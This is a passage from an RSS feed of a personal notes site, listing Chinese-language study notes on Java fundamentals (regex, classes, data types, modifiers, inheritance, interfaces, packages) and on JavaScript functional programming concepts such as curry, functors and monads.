+0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/15.%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</guid><description>正则表达式 # java.util.regex 包主要包括以下三个类：
Pattern 类：
pattern 对象是一个正则表达式的编译表示。Pattern 类没有公共构造方法。要创建一个 Pattern 对象，你必须首先调用其公共静态编译方法，它返回一个 Pattern 对象。该方法接受一个正则表达式作为它的第一个参数。
Matcher 类：
Matcher 对象是对输入字符串进行解释和匹配操作的引擎。与Pattern 类一样，Matcher 也没有公共构造方法。你需要调用 Pattern 对象的 matcher 方法来获得一个 Matcher 对象。
PatternSyntaxException：
PatternSyntaxException 是一个非强制异常类，它表示一个正则表达式模式中的语法错误。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/2.%E5%AF%B9%E8%B1%A1%E5%92%8C%E7%B1%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/2.%E5%AF%B9%E8%B1%A1%E5%92%8C%E7%B1%BB/</guid><description>对象和类 # Java作为一种面向对象语言。支持以下基本概念：多态、继承、封装、抽象、类、对象、实例、方法、重载。
构造方法，成员定义调用等，均与 C++ 类似。
源文件声明规则 # 在本节的最后部分，我们将学习源文件的声明规则。当在一个源文件中定义多个类，并且还有 import 语句和package语句时，要特别注意这些规则。
一个源文件中只能有一个 public 类 一个源文件可以有多个非 public 类 源文件的名称应该和 public 类的类名保持一致。例如：源文件中 public 类的类名是 Employee，那么源文件应该命名为 Employee.java。 如果一个类定义在某个包中，那么 package 语句应该在源文件的首行。 如果源文件包含 import 语句，那么应该放在 package 语句和类定义之间。如果没有 package 语句，那么 import 语句应该在源文件中最前面。 import 语句和 package 语句对源文件中定义的所有类都有效。在同一源文件中，不能给不同的类不同的包声明。 类有若干种访问级别，并且类也分不同的类型：抽象类和 final 类等。这些将在访问控制章节介绍。
除了上面提到的几种类型，Java还有一些特殊的类，如：内部类、匿名类。
JAVA包 # Import 语句 # 在Java中，如果给出一个完整的限定名，包括包名、类名，那么Java编译器就可以很容易地定位到源代码或者类。Import语句就是用来提供一个合理的路径，使得编译器可以找到某个类。
例如，下面的命令行将会命令编译器载入 java_installation/java/io 路径下的所有类
import java.io.*;</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</guid><description>基本数据类型 # Java 的两大数据类型:
内置数据类型 引用数据类型 内置数据类型 # Java语言提供了八种基本类型。六种数字类型（四个整数型，两个浮点型），一种字符类型，还有一种布尔型。
byte：
byte 数据类型是8位、有符号的，以二进制补码表示的整数； 最小值是 -128（-2^7）； 最大值是 127（2^7-1）； 默认值是 0； byte 类型用在大型数组中节约空间，主要代替整数，因为 byte 变量占用的空间只有 int 类型的四分之一； 例子：byte a = 100，byte b = -50。 short：
short 数据类型是 16 位、有符号的以二进制补码表示的整数 最小值是 -32768（-2^15）； 最大值是 32767（2^15 - 1）； Short 数据类型也可以像 byte 那样节省空间。一个short变量是int型变量所占空间的二分之一； 默认值是 0； 例子：short s = 1000，short r = -20000。 int：
int 数据类型是32位、有符号的以二进制补码表示的整数； 最小值是 -2,147,483,648（-2^31）； 最大值是 2,147,483,647（2^31 - 1）； 一般地整型变量默认为 int 类型； 默认值是 0 ； 例子：int a = 100000, int b = -200000。 long：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/4.%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/4.%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B/</guid><description>变量类型 # 在 Java 语言中，所有的变量在使用前必须声明。声明变量的基本格式如下：
type identifier [ = value][, identifier [= value] ...] ; Java 语言支持的变量类型有：
类变量：独立于方法之外的变量，用 static 修饰。 实例变量：独立于方法之外的变量，不过没有 static 修饰。 局部变量：类的方法中的变量。 Java 局部变量 # 局部变量声明在方法、构造方法或者语句块中； 局部变量在方法、构造方法、或者语句块被执行的时候创建，当它们执行完成后，变量将会被销毁； 访问修饰符不能用于局部变量； 局部变量只在声明它的方法、构造方法或者语句块中可见； 局部变量是在栈上分配的。 局部变量没有默认值，所以局部变量被声明后，必须经过初始化，才可以使用。 Java 实例变量 # 实例变量声明在一个类中，但在方法、构造方法和语句块之外； 当一个对象被实例化之后，每个实例变量的值就跟着确定； 实例变量在对象创建的时候创建，在对象被销毁的时候销毁； 实例变量的值应该至少被一个方法、构造方法或者语句块引用，使得外部能够通过这些方式获取实例变量信息； 实例变量可以声明在使用前或者使用后； 访问修饰符可以修饰实例变量； 实例变量对于类中的方法、构造方法或者语句块是可见的。一般情况下应该把实例变量设为私有。通过使用访问修饰符可以使实例变量对子类可见； 实例变量具有默认值。数值型变量的默认值是 0，布尔型变量的默认值是 false，引用类型变量的默认值是 null。变量的值可以在声明时指定，也可以在构造方法中指定； 实例变量可以直接通过变量名访问。但在静态方法以及其他类中，就应该使用完全限定名：ObejectReference.VariableName。 类变量（静态变量） # 类变量也称为静态变量，在类中以 statiic 关键字声明，但必须在方法构造方法和语句块之外。 无论一个类创建了多少个对象，类只拥有类变量的一份拷贝。 静态变量除了被声明为常量外很少使用。常量是指声明为 public/private，final 和 static 类型的变量。常量初始化后不可改变。 静态变量储存在静态存储区。经常被声明为常量，很少单独使用 static 声明变量。 静态变量在第一次被访问时创建，在程序结束时销毁。 与实例变量具有相似的可见性。但为了对类的使用者可见，大多数静态变量声明为 public 类型。 默认值和实例变量相似。数值型变量默认值是 0，布尔型默认值是 false，引用类型默认值是 null。变量的值可以在声明的时候指定，也可以在构造方法中指定。此外，静态变量还可以在静态语句块中初始化。 静态变量可以通过：ClassName.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/5.%E4%BF%AE%E9%A5%B0%E7%AC%A6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/5.%E4%BF%AE%E9%A5%B0%E7%AC%A6/</guid><description>修饰符 # 访问修饰符 # Java中，可以使用访问控制符来保护对类、变量、方法和构造方法的访问。Java 支持 4 种不同的访问权限。
default (即缺省，什么也不写）: 在同一包内可见，不使用任何修饰符。使用对象：类、接口、变量、方法。 private : 在同一类内可见。使用对象：变量、方法。 注意：不能修饰类（外部类） public : 对所有类可见。使用对象：类、接口、变量、方法 protected : 对同一包内的类和所有子类可见。使用对象：变量、方法。 注意：不能修饰类（外部类）。 我们可以通过以下表来说明访问权限：
修饰符 当前类 同一包内 子孙类(同一包) 子孙类(不同包) 其他包 public Y Y Y Y Y protected Y Y Y Y/N（说明） N default Y Y Y N N private Y N N N N 非访问修饰符 # 为了实现一些其他的功能，Java 也提供了许多非访问修饰符。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/6.%E8%BF%90%E7%AE%97%E7%AC%A6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/6.%E8%BF%90%E7%AE%97%E7%AC%A6/</guid><description>运算符 # http://www.runoob.com/java/java-operators.html</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/7.%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/7.%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/</guid><description>循环结构 # http://www.runoob.com/java/java-loop.html</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/8.%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/8.%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5/</guid><description>条件语句 # http://www.runoob.com/java/java-if-else-switch.html</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/9.number%E5%92%8Cmath%E7%B1%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/9.number%E5%92%8Cmath%E7%B1%BB/</guid><description>Number # 所有的包装类**（Integer、Long、Byte、Double、Float、Short）**都是抽象类 Number 的子类，如下图：
这种由编译器特别支持的包装称为装箱，所以当内置数据类型被当作对象使用的时候，编译器会把内置类型装箱为包装类。相似的，编译器也可以把一个对象拆箱为内置类型。Number 类属于 java.lang 包。
Math 类 # Java 的 Math 包含了用于执行基本数学运算的属性和方法，如初等指数、对数、平方根和三角函数。
Math 的方法都被定义为 static 形式，通过 Math 类可以在主函数中直接调用。
下面的表中列出的是 Number &amp;amp; Math 类常用的一些方法：http://www.runoob.com/java/java-number.html</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/1.%E7%BB%A7%E6%89%BF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/1.%E7%BB%A7%E6%89%BF/</guid><description>继承 # 类的继承格式 # 在 Java 中通过 extends 关键字可以申明一个类是从另外一个类继承而来的，一般形式如下：
class 父类 { } class 子类 extends 父类 { } 继承类型 # 需要注意的是 Java 不支持多继承，但支持多重继承：
继承的特性 # 子类拥有父类非 private 的属性、方法。 子类可以拥有自己的属性和方法，即子类可以对父类进行扩展。 子类可以用自己的方式实现父类的方法。 Java 的继承是单继承，但是可以多重继承，单继承就是一个子类只能继承一个父类，多重继承就是，例如 A 类继承 B 类，B 类继承 C 类，所以按照关系就是 C 类是 B 类的父类，B 类是 A 类的父类，这是 Java 继承区别于 C++ 继承的一个特性。 提高了类之间的耦合性（继承的缺点，耦合度高就会造成代码之间的联系越紧密，代码独立性越差）。 继承关键字 # 继承可以使用 extends 和 implements 这两个关键字来实现继承，而且所有的类都是继承于 java.lang.Object，当一个类没有继承的两个关键字，则默认继承object（这个类在 java.lang 包中，所以不需要 import）祖先类。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/2.%E9%87%8D%E5%86%99%E4%B8%8E%E9%87%8D%E8%BD%BD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/2.%E9%87%8D%E5%86%99%E4%B8%8E%E9%87%8D%E8%BD%BD/</guid><description>重写与重载 # 重写 Override # 重写是子类对父类的允许访问的方法的实现过程进行重新编写, 返回值和形参都不能改变。即外壳不变，核心重写！
重写的好处在于子类可以根据需要，定义特定于自己的行为。 也就是说子类能够根据需要实现父类的方法。
方法的重写规则：
参数列表必须完全与被重写方法的相同； 返回类型必须完全与被重写方法的返回类型相同； 访问权限不能比父类中被重写的方法的访问权限更低。例如：如果父类的一个方法被声明为 public，那么在子类中重写该方法就不能声明为 protected。 父类的成员方法只能被它的子类重写。 声明为 final 的方法不能被重写。 声明为 static 的方法不能被重写，但是能够被再次声明。 子类和父类在同一个包中，那么子类可以重写父类所有方法，除了声明为 private 和 final 的方法。 子类和父类不在同一个包中，那么子类只能够重写父类的声明为 public 和 protected 的非 final 方法。 重写的方法能够抛出任何非强制异常，无论被重写的方法是否抛出异常。但是，重写的方法不能抛出新的强制性异常，或者比被重写方法声明的更广泛的强制性异常，反之则可以。 构造方法不能被重写。 如果不能继承一个方法，则不能重写这个方法。 NOTICE: 当需要在子类中调用父类的被重写方法时，要使用 super 关键字。
重载 Overload # 重载 (overloading) 是在一个类里面，方法名字相同，而参数不同。返回类型可以相同也可以不同。
每个重载的方法（或者构造函数）都必须有一个独一无二的参数类型列表。
最常用的地方就是构造器的重载。
规则：
被重载的方法必须改变参数列表(参数个数或类型不一样)； 被重载的方法可以改变返回类型； 被重载的方法可以改变访问修饰符； 被重载的方法可以声明新的或更广的检查异常； 方法能够在同一个类中或者在一个子类中被重载。 无法以返回值类型作为重载函数的区分标准。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/3.%E5%A4%9A%E6%80%81/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/3.%E5%A4%9A%E6%80%81/</guid><description>多态 # http://www.runoob.com/java/java-polymorphism.html</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/4.%E6%8A%BD%E8%B1%A1%E7%B1%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/4.%E6%8A%BD%E8%B1%A1%E7%B1%BB/</guid><description>抽象类 # http://www.runoob.com/java/java-abstraction.html</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/5.%E5%B0%81%E8%A3%85/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/5.%E5%B0%81%E8%A3%85/</guid><description>封装 # http://www.runoob.com/java/java-encapsulation.html</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/6.%E6%8E%A5%E5%8F%A3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/6.%E6%8E%A5%E5%8F%A3/</guid><description>接口 # 接口（英文：Interface），在 JAVA 编程语言中是一个抽象类型，是抽象方法的集合，接口通常以 interface 来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。
接口并不是类，编写接口的方式和类很相似，但是它们属于不同的概念。类描述对象的属性和方法。接口则包含类要实现的方法。
除非实现接口的类是抽象类，否则该类要定义接口中的所有方法。
接口无法被实例化，但是可以被实现。一个实现接口的类，必须实现接口内所描述的所有方法，否则就必须声明为抽象类。
另外，在 Java 中，接口类型可用来声明一个变量，他们可以成为一个空指针，或是被绑定在一个以此接口实现的对象。
接口特性：
接口中每一个方法也是隐式抽象的,接口中的方法会被隐式的指定为 public abstract（只能是 public abstract，其他修饰符都会报错）。
接口中可以含有变量，但是接口中的变量会被隐式的指定为 public static final 变量（并且只能是 public，用 private 修饰会报编译错误）。
接口中的方法是不能在接口中实现的，只能由实现接口的类来实现接口中的方法。
抽象类和接口的区别：
抽象类中的方法可以有方法体，就是能实现方法的具体功能，但是接口中的方法不行。
抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是 public static final 类型的。
接口中不能含有静态代码块以及静态方法(用 static 修饰的方法)，而抽象类是可以有静态代码块和静态方法。
一个类只能继承一个抽象类，而一个类却可以实现多个接口。
声明 # 接口的声明语法格式如下：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/7.%E5%8C%85/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/7.%E5%8C%85/</guid><description>包 (package) # 为了更好地组织类，Java 提供了包机制，用于区别类名的命名空间。
包的作用：
把功能相似或相关的类或接口组织在同一个包中，方便类的查找和使用。
如同文件夹一样，包也采用了树形目录的存储方式。同一个包中的类名字是不同的，不同的包中的类的名字是可以相同的，当同时调用两个不同包中相同类名的类时，应该加上包名加以区别。因此，包可以避免名字冲突。
包也限定了访问权限，拥有包访问权限的类才能访问某个包中的类。
Java 使用包（package）这种机制是为了防止命名冲突，访问控制，提供搜索和定位类（class）、接口、枚举（enumerations）和注释（annotation）等。
包语句的语法格式为：
package pkg1[．pkg2[．pkg3…]]; 一个包（package）可以定义为一组相互联系的类型（类、接口、枚举和注释），为这些类型提供访问保护和命名空间管理的功能。
以下是一些 Java 中的包：
java.lang-打包基础的类 java.io-包含输入输出功能的函数 package 目录结构 # 类放在包中会有两种主要的结果：
包名成为类名的一部分，正如我们前面讨论的一样。 包名必须与相应的字节码所在的目录结构相吻合。 例如：有一个 com.runoob.test 的包，这个包包含一个叫做 Runoob.java 的源文件，那么相应的，应该有如下面的一连串子目录：
....\com\runoob\test\Runoob.java 编译的时候，编译器为包中定义的每个类、接口等类型各创建一个不同的输出文件，输出文件的名字就是这个类型的名字，并加上 .class 作为扩展后缀。 例如：
// 文件名: Runoob.java package com.runoob.test; public class Runoob { } class Google { } 现在，我们用-d选项来编译这个文件，如下：
$ javac -d .</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/functional/1.basic/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/functional/1.basic/</guid><description>函数式编程入门 # 纯函数 # 什么是纯函数？
纯函数：相同的输入，永远会得到相同的输出，而且没有任何可观察的副作用。 为什么要追求纯函数？
可缓存性（Cacheable）：JavaScript 中应用最广泛的库为 memoizee； 可移植性（Portable）：可移植性可以意味着把函数序列化。与之相对的是面向对象语言，移植一个对象通常需要将整个庞大的体系迁移，这也是 JavaScript 拥有强大的组件化生态的原因。 自文档化（Self-Documenting）：不需要过多的 Context 来描述函数执行前、执行后的效果； 可测试性（Testable）：Quickcheck，一个为函数式环境量身定制的测试工具。 引用透明性（Referential Transparency）：如果一个函数调用可以完全用它的返回值代替，那么称这个函数时引用透明的。 柯里化 (Curry) # Curry 的概念：
只传递给函数一部分参数来调用它，让它返回一个函数去处理剩下的参数。 柯里化函数的简单实现：
var curry = fn =&amp;gt; function $curry(...args) { return (args.length &amp;lt; fn.length) ? $curry.bind(null, ...args) : fn.call(null, ...args); } 函数组合 (Compose) # 以下的操作称作为两个函数 f、g 的组合（相当于数学中的复合函数）：
var compose = (f,g) =&amp;gt; ( (x) =&amp;gt; f(g(x)) ); JavaScript 中有一个为了函数式编程设计的库就聚合了 compose、curry 等函数：ramda</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/functional/2.container/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/functional/2.container/</guid><description>容器 # 通过一些基础的函数式编程操作，我们得以更优雅地进行编程，但是之前使用的纯函数编程方法却并不能解决所有的问题。比如：控制流、异常处理、异步操作、状态变化等。这些问题都可以用本节抽象的概念解决。
Container # 通过如下方式定义的对象称为一个简单的容器：
class Container { constructor(x) { this.$value = x; } static of (x) { return new this.constructor(x); } } 其中 static 函数 of 仅仅是为了方便代码更加函数化而定义，不影响理论探究的函数。
具体的，容器的操作应该遵循以下的约定：
Container 是一个有且仅有一个属性的对象，我们后面将抽象地将它命名为 $value； $value 不能被约束为任何特定的类型，否则我们的使用场景将相当有限； $value 一旦进入容器，它将一只被设置在容器内。我们可以但不应当通过 .$value 这种访问属性的方式访问他。 Functor (Identity) # Functor 是一类特殊的 Container，我们后续讨论的容器都是基于 Functor 的。它的简单实现：
class Functor extends Container { map(f) { return Functor.of( f(this.$value) ); } } 所以 Functor 是：一种实现了 map 方法的容器。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/functional/3.monad/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/functional/3.monad/</guid><description>Monad # Pointy Functor Factory # 在前面有关 Functor 的论述中使用了 of 函数，实际上这个函数并不是用来替换 new 这个操作符的：
Pointed Functor：一种实现了 of 方法的 Functor。 of 方法在很多地方以不同的名称出现，但是它们都是相同的意思，比如 pure, point, unit 或 return。
JavaScript 语言中有许多类型功能的库：folktale、ramda 或 fantasy-land。
What&amp;rsquo;s Monad? # 先看一个通过 Container 方法从 Json 中获取给定字段的例子：
const safeProp: string =&amp;gt; object =&amp;gt; Mabey&amp;lt;any&amp;gt; = curry((x, obj) =&amp;gt; Maybe.of(obj[x])); const safeHead: object =&amp;gt; Maybe&amp;lt;any&amp;gt; = safeProp(0); const firstAddressStreet: object =&amp;gt; Maybe&amp;lt;Maybe&amp;lt;Maybe&amp;lt;any&amp;gt;&amp;gt;&amp;gt; = compose( map(map(safeProp(&amp;#39;street&amp;#39;))), map(safeHead), safeProp(&amp;#39;addresses&amp;#39;), ); firstAddressStreet({ addresses: [{ street: { name: &amp;#39;Mulburry&amp;#39;, number: 8402 }, postcode: &amp;#39;WC2N&amp;#39; }], }); 可以看到在处理真实场景时，map 会像上面的情况一样出现多层嵌套的情况。我们可以用 join 函数解决上面的问题：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/functional/4.applicative/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/functional/4.applicative/</guid><description>Applicative # Brief Introduction # Applicative 指的是这样的一个性质：functor 之间可以相互 apply。
看下面这样一个例子：
Container.of(2).chain(two =&amp;gt; Container.of(3).map(add(two))); 上面是一个用 Monad 实现 2+3 的例子，可以看到我们需要构造 Container.of(3) 然后构造一个加法函数，最后构造一个 Container.of(2) 进行应用。
我们发现 Container.of(3)/Container.of(2) 具有先后的构造关系，这是没有必要的，如果我们能同时构造两个 Functor 并且其中一个应用到另一个上，那么我们就完美解决了这个问题，这个性质就叫做 Applicative。
ap # 在 applicative 这个概念里的核心函数是 ap。它的实现如下：
// 类型签名 type apSig&amp;lt;Farg, Fret&amp;gt; = (Container&amp;lt;Farg&amp;gt;, Container&amp;lt;Farg =&amp;gt; Fret&amp;gt;) =&amp;gt; Container&amp;lt;Fret&amp;gt;; // 函数实现 Container.prototype.ap = function (otherContainer) { return otherContainer.map(this.$value); } ap 函数的实现即 Applicative Functor 的定义：
实现了 ap 函数的 Pointed Functor 即为 Applicative Functor； 可以用 ap 优化上面的例子：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/html5/html-css%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/html5/html-css%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/</guid><description>自学笔记 (pdf) #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/html5/javascript%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 